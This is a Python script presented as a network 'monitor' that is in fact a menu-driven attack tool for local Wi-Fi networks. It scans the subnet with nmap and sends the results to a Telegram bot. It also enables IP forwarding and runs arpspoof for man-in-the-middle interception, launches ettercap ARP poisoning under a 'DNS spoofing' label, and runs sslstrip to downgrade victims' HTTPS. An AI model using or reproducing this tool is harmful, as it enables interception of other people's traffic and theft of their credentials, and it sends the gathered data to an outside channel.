import os
import time
import requests
from termcolor import colored

# ==== CONFIG ====
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

# ==== BANNER ====
def print_banner():
    os.system('clear')
    print(colored("""
         ██╗  ██╗███████╗██╗  ██╗
         ██║  ██║██╔════╝╚██╗██╔╝
         ███████║█████╗   ╚███╔╝ 
         ██╔══██║██╔══╝   ██╔██╗ 
         ██║  ██║███████╗██╔╝ ██╗
         ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
           HEX ULTIMATE MONITOR
    """, 'red'))

# ==== TELEGRAM ====
def send_to_telegram(info):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": info}
        requests.post(url, data=data)
        print(colored("[✓] Sent to Telegram", "green"))
    except:
        print(colored("[!] Failed to send", "red"))

# ==== SAVE LOG ====
def save_log(info):
    with open("root_log.txt", "a") as f:
        f.write(info + "\n")

# ==== SCAN NETWORK ====
def scan_network():
    os.system("nmap -sn 192.168.1.0/24 -oG result.txt")
    with open("result.txt", "r") as f:
        data = f.read()
    print(colored("[✓] Devices Found:\n", "cyan") + data)
    save_log(data)
    send_to_telegram(f"[HEX Scan]\n{data}")

# ==== MITM ATTACK ====
def mitm_attack():
    print(colored("[!] Enabling IP forwarding...", "yellow"))
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    target = input("Enter Target IP: ")
    gateway = input("Enter Gateway IP: ")
    os.system(f"arpspoof -i wlan0 -t {target} {gateway}")

# ==== DNS SPOOF ====
def dns_spoofing():
    print(colored("[*] Launching Ettercap...", "cyan"))
    os.system("ettercap -T -i wlan0 -q -M arp:remote")

# ==== SSL STRIP ====
def ssl_strip():
    print(colored("[*] Running SSL Strip on port 8080...", "yellow"))
    os.system("sslstrip -l 8080")

# ==== AUTO IP DETECT ====
def detect_ip_range():
    os.system("ip route | grep wlan")

# ==== MAIN MENU ====
def main():
    print_banner()
    while True:
        print(colored("\n[1] Scan Network", 'blue'))
        print("[2] Start MITM Attack")
        print("[3] DNS Spoofing")
        print("[4] SSL Strip")
        print("[5] Auto IP Detect")
        print("[6] Exit")

        choice = input(colored("\nSelect: ", 'yellow'))

        if choice == "1":
            scan_network()
        elif choice == "2":
            mitm_attack()
        elif choice == "3":
            dns_spoofing()
        elif choice == "4":
            ssl_strip()
        elif choice == "5":
            detect_ip_range()
        elif choice == "6":
            print(colored("Bye HEX!", "red"))
            break
        else:
            print(colored("Invalid option", "red"))

if __name__ == "__main__":
    main()
